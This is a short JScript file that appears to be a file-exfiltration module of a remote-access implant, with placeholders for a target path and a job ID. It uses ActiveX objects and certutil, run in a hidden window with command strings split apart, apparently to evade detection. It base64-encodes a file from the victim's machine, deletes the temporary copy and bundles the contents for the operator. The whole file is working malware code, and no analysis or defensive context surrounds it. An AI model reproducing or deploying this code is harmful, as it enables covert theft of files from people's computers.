uuid = function () {
    try {
        function random() {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return random() + random() + '-' + random() + '-' + random() + '-' +
            random() + '-' + random() + random() + random();
    }
    catch (e) {
    }
}

readFile = function (pathname) {
    fso1 = new ActiveXObject("Scripting.FileSystemObject");
    f = fso1.OpenTextFile(pathname, 1);
    g = f.ReadAll();
    f.close();
    return g;
}

deleteFile = function (pathname) {
    fso1 = new ActiveXObject("Scripting.FileSystemObject");
    f = fso1.GetFile(pathname);
    f.Delete();
}

try {
    fso1 = new ActiveXObject("Scripting.FileSystemObject");
    if (fso1.FileExists("~REMOTE_PATHNAME~")) {
        tempout = fso1.GetSpecialFolder(2) + "\\" + uuid() + ".t" + "xt";
        r = new ActiveXObject("WScript.Shell").Run("certut" + "il -encode " + " ~REMOTE_PATHNAME~ " + tempout,0,true);
        d = readFile(tempout);
        deleteFile(tempout);
        c = "~JOB_ID~" + "|" + d;
    }
    else{
        c = "~JOB_ID~" + "|" + "[download fail:File not exists]";
    }
}
catch (ex) {
    c = "~JOB_ID~" + "|" + "[download fail]";
}
